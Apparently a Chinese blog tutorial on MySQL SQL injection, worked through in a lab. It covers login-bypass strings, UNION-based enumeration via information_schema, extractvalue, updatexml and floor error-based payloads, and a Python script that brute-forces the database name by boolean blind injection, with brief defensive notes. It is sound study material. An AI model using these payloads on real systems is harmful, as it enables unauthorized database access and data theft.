title="更新于 2021-09-02 14:37:35"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2021-09-02</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">8.9k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 34 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="一、字符型和数字型注入"><a href="#一、字符型和数字型注入" class="headerlink" title="一、字符型和数字型注入"></a>一、字符型和数字型注入</h2><h3 id="1-and-or-操作符"><a href="#1-and-or-操作符" class="headerlink" title="1. and or 操作符"></a>1. and or 操作符</h3><h4 id="1-1-简述"><a href="#1-1-简述" class="headerlink" title="1.1 简述"></a>1.1 简述</h4><p>  and和or属于运算符，主要用途是把多个条件结合起来，过滤sql语句的返回结果。主要用在where语句中。</p>
<h4 id="1-2-作用"><a href="#1-2-作用" class="headerlink" title="1.2 作用"></a>1.2 作用</h4><ul>
<li>可以起到一个条件连接的作用，尤其是在盲注时</li>
<li>当注释符被过滤，还可以使用and加上一个retu条件，闭合单引号</li>
</ul>
<h4 id="1-3-and"><a href="#1-3-and" class="headerlink" title="1.3 and"></a>1.3 and</h4><p>and 又叫与运算,当两个条件都为真时，返回真，否则为假。格式：条件1 adn 条件2<br>实例：<code>select * from user where id=7 and username=&#39;admin&#39;;</code><br>虽然id=7的数据存在，但这条数据的username不是admin，所以返回数据为空<br><img src="https://img.xpctf.cn/img/20200616100440.png" alt=""></p>
<h4 id="1-4-or"><a href="#1-4-or" class="headerlink" title="1.4 or"></a>1.4 or</h4><p>or又叫或运算，有一个条件为真，结果为真，两边都为假，则为假。格式：条件1 or 条件2<br>实例：<code>select * from user where id=8 or username=&#39;test1&#39;;</code><br>满足条件的数据有两个，所以输出两条数据<br><img src="https://img.xpctf.cn/img/20200616100021.png" alt=""></p>
<h3 id="2-MySQL注释符"><a href="#2-MySQL注释符" class="headerlink" title="2. MySQL注释符"></a>2. MySQL注释符</h3><h4 id="2-1-作用"><a href="#2-1-作用" class="headerlink" title="2.1 作用"></a>2.1 作用</h4><p>  当程序运行时，不会对注释的内容做任何处理，注释一般可以出现在程序的任何地方，用来提示或者解释程序功能。</p>
<h4 id="2-2-单行注释"><a href="#2-2-单行注释" class="headerlink" title="2.2 单行注释"></a>2.2 单行注释</h4><p>在MySQL中单行注释符号有两个，一个是<code>#</code>，另一个是<code>-- -</code><br><code>-- -</code>比较特殊，他的原型是<code>--</code>,两个杠后面有个空格，但为了区分空格常常在后面有个字符，那个字符可以为任意字符，也可以不加，但空格不能少。<br><img src="https://img.xpctf.cn/img/20200616102132.png" alt="#"><br><img src="https://img.xpctf.cn/img/20200616102213.png" alt="-- -"></p>
<h4 id="2-3-多行注释"><a href="#2-3-多行注释" class="headerlink" title="2.3 多行注释"></a>2.3 多行注释</h4><p>多行使用<code>/**/</code>来注释，在一般单行注释被过滤的时候使用，但是必须闭合，所以我不知道他在注入中的意义在哪里。</p>
<h3 id="3-数字型注入"><a href="#3-数字型注入" class="headerlink" title="3. 数字型注入"></a>3. 数字型注入</h3><p>简述：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
<h4 id="3-1-加单引号"><a href="#3-1-加单引号" class="headerlink" title="3.1 加单引号"></a>3.1 加单引号</h4><p>URL：<code>www.text.com/text.php?id=3&#39;</code><br>SQL：<code>select * from table where id=3&#39;</code><br>如果sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常，此时可能存在SQL注入</p>
<h4 id="3-2-加and-1-1"><a href="#3-2-加and-1-1" class="headerlink" title="3.2 加and 1=1"></a>3.2 加and 1=1</h4><p>URL：<code>www.text.com/text.php?id=3 and 1=1</code><br>SQL：<code>select * from table where id=3’ and 1=1</code><br>语句执行正常，与原始页面如任何差异，此时可能存在SQL注入</p>
<h4 id="3-3-加and-1-2"><a href="#3-3-加and-1-2" class="headerlink" title="3.3 加and 1=2"></a>3.3 加and 1=2</h4><p>URL：<code>www.text.com/text.php?id=3 and 1=2</code><br>SQL：<code>select * from table where id=3 and 1=2</code><br>语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异,此时可能存在SQL注入</p>
<h4 id="3-4-防御数字型注入"><a href="#3-4-防御数字型注入" class="headerlink" title="3.4 防御数字型注入"></a>3.4 防御数字型注入</h4><p>  使用intval函数强制把用户输入的内容转换为int类型。</p>
<h3 id="4-字符型注入"><a href="#4-字符型注入" class="headerlink" title="4. 字符型注入"></a>4. 字符型注入</h3><p>  简述：当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来包裹，而字符串一般需要通过单引号来包裹字符。<br>例如数字型语句：<code>select * from table where id =3</code><br>而字符型如下：<code>select * from table where name=&#39;admin&#39;</code><br>因此，在构造payload时通过闭合单引号可以成功执行语句</p>
<h4 id="4-1-加单引号"><a href="#4-1-加单引号" class="headerlink" title="4.1 加单引号"></a>4.1 加单引号</h4><p>URL：<code>www.text.com/text.php?name=admin&#39;</code><br>SQL：<code>select * from table where name=&#39;admin&#39;&#39;</code><br>由于加单引号后变成三个单引号，则无法执行，如果报错，此时可能存在SQL注入</p>
<h4 id="4-2-加-’and-1-1"><a href="#4-2-加-’and-1-1" class="headerlink" title="4.2 加 ’and 1=1"></a>4.2 加 ’and 1=1</h4><p>URL：<code>www.text.com/text.php?name=admin&#39; and 1=1</code><br>SQL：<code>select * from table where name=&#39;admin&#39; and 1=1&#39;</code></p>
<p>也无法进行注入，还需要通过注释符号将其绕过,或者闭合后面的双引号</p>
<h4 id="4-3-加‘and-1-2–"><a href="#4-3-加‘and-1-2–" class="headerlink" title="4.3 加‘and 1=2– +"></a>4.3 加‘and 1=2– +</h4><p>URL：<code>www.text.com/text.php?name=admin&#39; and 1=2-- +</code><br>SQL：<code>select * from table where name=&#39;admin&#39; and 1=2-- +&#39;</code><br>由于最后有个单引号被注释，所以该SQL语句合法，加1=2类似数字型注入。</p>
<h4 id="4-4-万能密码"><a href="#4-4-万能密码" class="headerlink" title="4.4 万能密码"></a>4.4 万能密码</h4><p>字符型万能密码必须闭合单引号，可以通过注释，也可以通过闭合最后的单引号</p>
<ul>
<li>‘ or 1=1 – +</li>
<li>‘ or ‘1’=’1</li>
<li>‘ or 1– +</li>
</ul>
<h4 id="4-5-防御字符型注入"><a href="#4-5-防御字符型注入" class="headerlink" title="4.5 防御字符型注入"></a>4.5 防御字符型注入</h4><p>因为字符型注入需要输入单引号来闭合SQL语句，所以在防御上可以过滤单引号和转义单引号。</p>
<ul>
<li>使用addslashes函数对用户输入的字符进行转义</li>
</ul>
<h2 id="二、union联合查询注入"><a href="#二、union联合查询注入" class="headerlink" title="二、union联合查询注入"></a>二、union联合查询注入</h2><h3 id="1-union"><a href="#1-union" class="headerlink" title="1. union"></a>1. union</h3><p>union主要是把两个查询结果连接起来，放到一个结果集；前后查询的列名可以不一样，但列的数量必须一致。<br>SQL：<code>select username,password from user union select id from user;</code><br><img src="https://img.xpctf.cn/img/20200617112814.png" alt=""><br>因为前面查询的是username,password两个列，后面值查询了id一个列，所以抛出错误。</p>
<h3 id="2-order-by"><a href="#2-order-by" class="headerlink" title="2.order by"></a>2.order by</h3><p>order by 主要是根据列名来排序，默认按照升序对结果集进行排序；也可以使用desc关键字来对结果集进行降序排序</p>
<p>在SQL注入中常常被利用来检测返回多少列，当order by根据一个不存在的列排序会报错，所以可以用来查询列的数量；为union联合查询做准备。</p>
<p>SQL：<code>select * from user order by 5;</code><br><img src="https://img.xpctf.cn/img/20200617114041.png" alt=""></p>
<p>上面的SQL语句之所以会报错，是因为user表里面没有5个列，但我们使用第5个列来进行升序排序，所以报错。从而判断出该SQL语句返回4列。</p>
<p>order by 也可以直接使用列名来排序,这样的方式可以用来爆列名。比如：<code>select * from user order by id;</code></p>
<p>使用desc来进行奖项排序 <code>select * from user order by id desc;</code><br><img src="https://img.xpctf.cn/img/20200617115000.png" alt=""></p>
<h3 id="3-information-schema库"><a href="#3-information-schema库" class="headerlink" title="3. information_schema库"></a>3. information_schema库</h3><p>information_schema库是MySQL服务器自带的一个数据库，它提供了访问MySQL数据库元信息的方式，记录了MySQL服务器中的所有数据库名、表名、列名；这是学习MySQL注入必须掌握的一个知识点。</p>
<h4 id="3-1-schemata表"><a href="#3-1-schemata表" class="headerlink" title="3.1 schemata表"></a>3.1 schemata表</h4><p>schemata表记录了所有数据库的，列名为schema_name<br><img src="https://img.xpctf.cn/img/20200617145955.png" alt=""></p>
<h4 id="3-2-tables表"><a href="#3-2-tables表" class="headerlink" title="3.2 tables表"></a>3.2 tables表</h4><p>tables表记录了所有的表名，列名为table_name;包括该表属于那个数据库，列名为table_schema<br><img src="https://img.xpctf.cn/img/20200617150621.png" alt=""></p>
<h4 id="3-3-columns表"><a href="#3-3-columns表" class="headerlink" title="3.3 columns表"></a>3.3 columns表</h4><p>columns表记录了所有的列名，列名为column_name;数据库名称列名table_name;表名称列名为table_schema。<br><img src="https://img.xpctf.cn/img/20200617184130.png" alt=""></p>
<h3 id="4-union联合查询注入"><a href="#4-union联合查询注入" class="headerlink" title="4. union联合查询注入"></a>4. union联合查询注入</h3><p><strong>基本流程：判断类型=&gt;猜列数=&gt;测回显=&gt;爆库名=&gt;爆表名=&gt;爆列名=&gt;爆数据</strong></p>
<h4 id="4-1-利用条件"><a href="#4-1-利用条件" class="headerlink" title="4.1 利用条件"></a>4.1 利用条件</h4><ul>
<li>页面可以把数据输出：union联合查询需要把数据回显到页面上，所以使用union联合查询注入时，页面一定要把数据回显出来</li>
<li>union关键字没有被过滤：大多数SQL环境中，都会有WAF，对用户输出的字符串进行一定的过滤，所以只有当union这个关键词没有被过滤，或者可以绕过过滤的时候，才能使用union联合查询注入</li>
</ul>
<h4 id="4-2-判断类型"><a href="#4-2-判断类型" class="headerlink" title="4.2 判断类型"></a>4.2 判断类型</h4><p>通过加单引号的的方式判断类型，在正常返回的语句上加入单引号，如果返回异常，则为字符型，反之为数字型注入。<br>通过输入单引号返回异常，我们判断该注入为数字型注入。</p>
<p><img src="https://img.xpctf.cn/img/20200617193644.png" alt="返回正常"><br><img src="https://img.xpctf.cn/img/20200617193711.png" alt="返回异常"></p>
<h4 id="4-3-猜列数"><a href="#4-3-猜列数" class="headerlink" title="4.3 猜列数"></a>4.3 猜列数</h4><p>通过使用order by排序来判断返回列数；返回正常加列数，返回异常减列数<br>输入4正常返回，5不能正常返回，所以判断返回4个列。<br><img src="https://img.xpctf.cn/img/20200617194213.png" alt=""></p>
<h4 id="4-4-测回显"><a href="#4-4-测回显" class="headerlink" title="4.4 测回显"></a>4.4 测回显</h4><p>paylaod：<code>-1 union select 1,2,3,4;</code><br>id为-1的目的时为了上前面的语句报错，顺利的输出联合查询后面的语句。<br>1,2,3,4是上面得到四个列，因为联合查询前后的语句列数必须相等。<br>通过回显我发现回显位置在2和3上，在2和3上做注入查询。<br><img src="https://img.xpctf.cn/img/20200617195406.png" alt=""></p>
<h4 id="4-5-爆库名"><a href="#4-5-爆库名" class="headerlink" title="4.5 爆库名"></a>4.5 爆库名</h4><p>使用MySQL自带的函数，database()来查看当前使用的数据库；通过回显确定当前使用的数据库为web数据库。<br><img src="https://img.xpctf.cn/img/20200617195743.png" alt=""></p>
<h4 id="4-6-爆表名"><a href="#4-6-爆表名" class="headerlink" title="4.6 爆表名"></a>4.6 爆表名</h4><p>payload：<code>-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;web&#39;;</code><br>通过查询information_schema数据库的tables表的table_name列来返回表名，条件是web数据库的表。<br><img src="https://img.xpctf.cn/img/20200617202823.png" alt=""></p>
<h4 id="4-7-爆列名"><a href="#4-7-爆列名" class="headerlink" title="4.7 爆列名"></a>4.7 爆列名</h4><p>payload：<code>-1 union select 1,column_name,3,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;web&#39;</code><br>查询information_schema数据库的columns表的column_name列来返回列名，限制查询web数据库的user表。</p>
<p><img src="https://img.xpctf.cn/img/20200617203432.png" alt=""></p>
<h4 id="4-8-爆数据"><a href="#4-8-爆数据" class="headerlink" title="4.8 爆数据"></a>4.8 爆数据</h4><p>查询user表里的id列的值。<br><img src="https://img.xpctf.cn/img/20200617203620.png" alt=""></p>
<h2 id="三、extractvalue报错注入"><a href="#三、extractvalue报错注入" class="headerlink" title="三、extractvalue报错注入"></a>三、extractvalue报错注入</h2><p>什么是报错注入：当计算机接收到非预期的输入就会报错，所以可以利用数据库的报错机制，人为的构造一些错误，让数据库把敏感信息爆出。<br>优点：当使用union联合查询被过滤时，可以使用报错注入，对列的数量没有要求<br>缺点：大多数情况下都会屏蔽报错信息，一旦屏蔽了报错信息，那就无法使用报错注入了</p>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h3><h4 id="1-1-xml基础"><a href="#1-1-xml基础" class="headerlink" title="1.1 xml基础"></a>1.1 xml基础</h4><p>XML是一门可扩展标记语言，用于传输和存储数据;XML元素与HTML的格式类似，但是XML格式要求更严格</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-extractvalue"><a href="#1-2-extractvalue" class="headerlink" title="1.2 extractvalue"></a>1.2 extractvalue</h4><p>extractvlue(XML_document,Xpath_str) 是用来提取XML数据的<br>参数一：XML_document XML对象可以是XML文件或者XML字符串<br>参数二：Xpath_str Xpath是格式的字符串<br><code>select extractvalue(&#39;&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;qwe123&lt;/password&gt;&lt;/user&gt;&#39;,&#39;/user/username&#39;);</code></p>
<h4 id="1-3-updatexml"><a href="#1-3-updatexml" class="headerlink" title="1.3 updatexml"></a>1.3 updatexml</h4><p>updatexml (XML_document,Xpath_string,new_value) 替换数据<br>参数一：XML_document XML对象可以是XML文件或者XML字符串<br>参数二：Xpath_str Xpath是格式的字符串<br>参数三：new_value 替换查找到的字符串</p>
<h4 id="1-4-concat"><a href="#1-4-concat" class="headerlink" title="1.4 concat"></a>1.4 concat</h4><p>concat(字符串1,字符串2,字符串n) 该函数是用来连接字符串。</p>
<h4 id="1-5-group-concat"><a href="#1-5-group-concat" class="headerlink" title="1.5 group_concat"></a>1.5 group_concat</h4><p>group_concat函数将多行结果合并成1一行，用逗号分隔，常用函数！</p>
<h4 id="1-6-substr函数"><a href="#1-6-substr函数" class="headerlink" title="1.6 substr函数"></a>1.6 substr函数</h4><p>substr函数将一个字符串截取，返回截取后的字符串<br>用法：substr(源字符串,开始,截取长度)<br>如果忽略参数三，截取到字符串末尾</p>
<h4 id="1-7-子查询"><a href="#1-7-子查询" class="headerlink" title="1.7 子查询"></a>1.7 子查询</h4><p>子查询也叫内查询、嵌套查询，是一种嵌套在其他语句中进行的查询，在报错注入中使用最多。<br>子查询规则：必须在括号内，子查询的select语句中，只能有一个列，除非主查询有多个列<br>实例：select(flag)from(flag);</p>
<h3 id="2-extractvalue报错注入"><a href="#2-extractvalue报错注入" class="headerlink" title="2. extractvalue报错注入"></a>2. extractvalue报错注入</h3><h4 id="2-1-确定注入点"><a href="#2-1-确定注入点" class="headerlink" title="2.1 确定注入点"></a>2.1 确定注入点</h4><p>payload：<code>id = 1 and (extractvalue(1,concat(0x5c,(select user()))))#</code><br><img src="https://img.xpctf.cn/img/20200625155521.png" alt=""></p>
<h4 id="2-2-爆数据库"><a href="#2-2-爆数据库" class="headerlink" title="2.2 爆数据库"></a>2.2 爆数据库</h4><p>payload：<code>id = 1 and (extractvalue(1,concat(0x5c,(select database()))))#</code><br><img src="https://img.xpctf.cn/img/20200625155834.png" alt=""></p>
<h4 id="2-3-爆表名"><a href="#2-3-爆表名" class="headerlink" title="2.3 爆表名"></a>2.3 爆表名</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;web&#39;))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160202.png" alt=""></p>
<h4 id="2-4-爆列名"><a href="#2-4-爆列名" class="headerlink" title="2.4 爆列名"></a>2.4 爆列名</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160507.png" alt=""></p>
<h4 id="2-5-拿到flag"><a href="#2-5-拿到flag" class="headerlink" title="2.5 拿到flag"></a>2.5 拿到flag</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select flag from flag))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160623.png" alt=""><br>由于报错注入最多只能返回32位字符，所以我们使用substr来截取后面部分。<br>payload：<code>id=1 and (extractvalue(1,concat(1,(select substr(flag,30) from flag))))%23</code><br><img src="https://img.xpctf.cn/img/20200625162719.png" alt=""></p>
<h3 id="3-updatexml报错注入"><a href="#3-updatexml报错注入" class="headerlink" title="3. updatexml报错注入"></a>3. updatexml报错注入</h3><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select user())),1))%23</code><br>payload分析：<br>   参数一：随便写，不合法即可<br>   参数二：concat连接的非xpath格式字符串，sql语句<br>   参数三：随便写，不合法即可</p>
<h4 id="3-1-爆数据库"><a href="#3-1-爆数据库" class="headerlink" title="3.1 爆数据库"></a>3.1 爆数据库</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select database())),1))%23</code><br><img src="https://img.xpctf.cn/img/20200625163731.png" alt=""></p>
<h4 id="3-2-爆表名"><a href="#3-2-爆表名" class="headerlink" title="3.2 爆表名"></a>3.2 爆表名</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select group_concat( table_name) from information_schema.tables where table_schema=&#39;web&#39;)),1))%23</code><br>这里使用的是group_concat来合并两行内容，当group_concat被屏蔽时，可以使用limit来一行一行输出。<br>payload：<code>id= 1 and (updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)),1))%23</code></p>
<h4 id="3-3-爆字段"><a href="#3-3-爆字段" class="headerlink" title="3.3 爆字段"></a>3.3 爆字段</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)),1))%23</code><br>构造好payload后修改关键部分即可使用。</p>
<h4 id="3-4-拿到flag"><a href="#3-4-拿到flag" class="headerlink" title="3.4 拿到flag"></a>3.4 拿到flag</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select flag from flag)),1))%23</code><br>拿到表名，列名即可构造查询语句来爆出值，显示不全使用substr。如果是root账号登录还可以跨数据库查询。</p>
<h2 id="四、floor报错注入"><a href="#四、floor报错注入" class="headerlink" title="四、floor报错注入"></a>四、floor报错注入</h2><h3 id="1-基础函数"><a href="#1-基础函数" class="headerlink" title="1. 基础函数"></a>1. 基础函数</h3><h4 id="1-1-floor函数"><a href="#1-1-floor函数" class="headerlink" title="1.1 floor函数"></a>1.1 floor函数</h4><p>取整，不进行四舍五入，忽略小数位返回整数部分。<br><code>select floor(0.8);==&gt;0</code><br><code>select floor(1.8);==&gt;1</code></p>
<h4 id="1-2-count函数"><a href="#1-2-count函数" class="headerlink" title="1.2 count函数"></a>1.2 count函数</h4><p>返回匹配条件的行数，一般和group by使用<br><img src="https://img.xpctf.cn/img/20200624110532.png" alt=""></p>
<h4 id="1-3-group-by函数"><a href="#1-3-group-by函数" class="headerlink" title="1.3 group by函数"></a>1.3 group by函数</h4><p>分组查询，把相同的列放在一起<br><img src="https://img.xpctf.cn/img/20200624113411.png" alt=""></p>
<p>使用count函数和group by函数返回列数<br><img src="https://img.xpctf.cn/img/20200624113643.png" alt=""></p>
<h4 id="1-4-rand函数"><a href="#1-4-rand函数" class="headerlink" title="1.4 rand函数"></a>1.4 rand函数</h4><p>产生有个0-1的随机数，格式select rand();<br>如果固定种子，产生的相同的数。</p>
<h4 id="1-5-limit函数"><a href="#1-5-limit函数" class="headerlink" title="1.5 limit函数"></a>1.5 limit函数</h4><p>limit函数用来限制sql语句的返回行数。<br>格式：limit 开始行，结束行(索引从0开始)</p>
<h3 id="2-主键重复报错注入"><a href="#2-主键重复报错注入" class="headerlink" title="2. 主键重复报错注入"></a>2. 主键重复报错注入</h3><p>payload：<code>id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br>payload分析：<br>   整条语句是一个大的select，最外层select的列名和表名随便写，不存在即可；第二层select是报错层，错误在这层select产生；user()是我们可以修改的语句，可以嵌套select，使用()包裹select合法语句。上面的语句可以当模板使用。</p>
<h4 id="2-1-爆数据库"><a href="#2-1-爆数据库" class="headerlink" title="2.1 爆数据库"></a>2.1 爆数据库</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br>直接使用database()函数即可查询当前使用的数据库，这是最有效和最快的方法。</p>
<h4 id="2-2-爆表名"><a href="#2-2-爆表名" class="headerlink" title="2.2 爆表名"></a>2.2 爆表名</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p>
<p>使用()包裹新的select查询语句，报错注入中不能使用group_concat函数(或者说我还没学到)，需要使用limit来控制输出行数，一行一行的输出表名，拿到我们想要的表名即可。</p>
<h4 id="2-3-爆列名"><a href="#2-3-爆列名" class="headerlink" title="2.3 爆列名"></a>2.3 爆列名</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;web&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p>
<p>该payload在爆表名的基础上修改列名和查询表，以及where查询条件即可。<br>由于我的web数据库中的user表和mysql数据库的user表冲突，所以加上and语句。</p>
<h4 id="2-4-拿到flag"><a href="#2-4-拿到flag" class="headerlink" title="2.4 拿到flag"></a>2.4 拿到flag</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select flag from flag limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p>
<p>这个很简单，就是替换一条查询语句，把列名和表替换成我们想读取的即可，当然也可以加入where条件，达到我们的预期效果；只要是合法的sql语句即可，再次又一次突出sql基础的重要性，你的sql水平决定你的sql注入水平。</p>
<h3 id="3-MySQL的一些特性"><a href="#3-MySQL的一些特性" class="headerlink" title="3. MySQL的一些特性"></a>3. MySQL的一些特性</h3><h4 id="3-1-name-const函数"><a href="#3-1-name-const函数" class="headerlink" title="3.1 name_const函数"></a>3.1 name_const函数</h4><p>name_const函数是给变量赋值<br>用法：select name_const(‘name’,’test’);<br>可以用来重复列名报错注入。只能拿到数据库版本<br>利用：select (select * from (select (name_const(version(),1)),name_const(version(),1))a);</p>
<h4 id="3-2-几何函数"><a href="#3-2-几何函数" class="headerlink" title="3.2 几何函数"></a>3.2 几何函数</h4><p>以下函数版本限制：MySQL &lt; 5.5.47<br>payload：<code>id = 1 and EXP(~(select * from (select user())a))</code><br>如果版本在5.5.47以下，会回显数据，但如果版本高于5.5.47，不会爆出语句执行结果；高版本可以使用这个特性来进行报错盲注。</p>
<h2 id="五、盲注"><a href="#五、盲注" class="headerlink" title="五、盲注"></a>五、盲注</h2><p>当页面不会把数据显示出来时，需要用到盲注；盲注分为布尔盲注和延时盲注。</p>
<h3 id="1-基础函数-1"><a href="#1-基础函数-1" class="headerlink" title="1. 基础函数"></a>1. 基础函数</h3><h4 id="1-1-substr函数"><a href="#1-1-substr函数" class="headerlink" title="1.1 substr函数"></a>1.1 substr函数</h4><p>substr函数 用于截取字符串，在前面我们已经使用过<br>用法：substr(str,pos,len)<br>参数一：需要截取的源字符串<br>参数二：开始截取的字符串下标，下标从1开始<br>参数三：截取长度，如果被忽略，则截取后面全部</p>
<h4 id="1-2-if函数"><a href="#1-2-if函数" class="headerlink" title="1.2 if函数"></a>1.2 if函数</h4><p>if函数 和大多数编程语言一致，都是条件判断函数<br>用法：select if(exp1,exp2,exp3)<br>参数一：if判断条件<br>参数二：条件为真返回结果<br>参数三：条件为假返回结果</p>
<h4 id="1-3-ascii函数"><a href="#1-3-ascii函数" class="headerlink" title="1.3 ascii函数"></a>1.3 ascii函数</h4><p>ascii函数 该函数返回一个字符的ascii函数，如果传递的参数有多个字符串，则返回第一个字符串的ascii值<br>用法：ascii(str)<br>参数一：str为字符，ascii的返回值在0-255之间</p>
<h4 id="1-4-length函数"><a href="#1-4-length函数" class="headerlink" title="1.4 length函数"></a>1.4 length函数</h4><p>length函数 与大部分编程语言一致，返回字符串长度<br>用法：length(str)</p>
<h4 id="1-5-sleep函数"><a href="#1-5-sleep函数" class="headerlink" title="1.5 sleep函数"></a>1.5 sleep函数</h4><p>sleep()函数 让程序带在当前位置停顿，停顿时间由参数决定，单位是秒<br>用法：select sleep(5);</p>
<h4 id="1-6-benchmark函数"><a href="#1-6-benchmark函数" class="headerlink" title="1.6 benchmark函数"></a>1.6 benchmark函数</h4><p>benchmark函数，重复执行表达式多少次<br>用法：benchmark(x,exp) 表达式exp执行x次<br>通过执行多次来达到sleep的效果</p>
<h3 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2. 布尔盲注"></a>2. 布尔盲注</h3><p>布尔盲注：人为的构造一个判断条件，条件为真正常返回，条件为假返回异常；利用这个特性，就可以根据我们的输入来逐个判断数据库中的数据。</p>
<h4 id="2-1-猜数据库"><a href="#2-1-猜数据库" class="headerlink" title="2.1 猜数据库"></a>2.1 猜数据库</h4><p><strong>先猜数据库名称长度：</strong><br>payload：<code>id=1 and length(database())=1</code><br>database()函数会返回当前数据库名，使用length()函数取数据库字符长度和1比较；如果当前数据库长度不等于1，则返回假，由于and运算符一个为假结果为假，所以页面显示异常。</p>
<p><strong>然后猜数据</strong><br>payload：<code>id=1 and length(database())=1</code><br>database()函数会返回当前数据库名，使用length()函数取数据库字符长度和1比较；如果当前数据库长度不等于1，则返回假，由于and运算符一个为假结果为假，所以页面显示异常。<br>payload：<code>id=1 and if((ascii(substr((database()),1,1))=119),1,0)</code><br>构造payload的时候，把格式构造好，然后逐个添加值，这样括号不容易出错。<br>119是我们猜测数据库的第一个字母的ascii值，值可以是0-255(一般从32开始到127)；修改substr的第二个来控制数据库名的第几位；<br>一般使用脚本来完成这件事，当然使用burp的爆破工具是最省事的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/8/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#数据库长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and if((ascii(substr((database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;),1,0)&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        a = re.findall(<span class="string">&#x27;&lt;h6&gt;(.*?)&lt;/h6&gt;&#x27;</span>,html.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-猜表名"><a href="#2-2-猜表名" class="headerlink" title="2.2 猜表名"></a>2.2 猜表名</h4><p><strong>先猜表名长度</strong><br>payload：<code>id=1 and if((select length(table_name) from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)=4,1,0)</code><br>只能使用limit一条条数据猜解，使用burp的intruder模块的数值递增来完成爆破。</p>
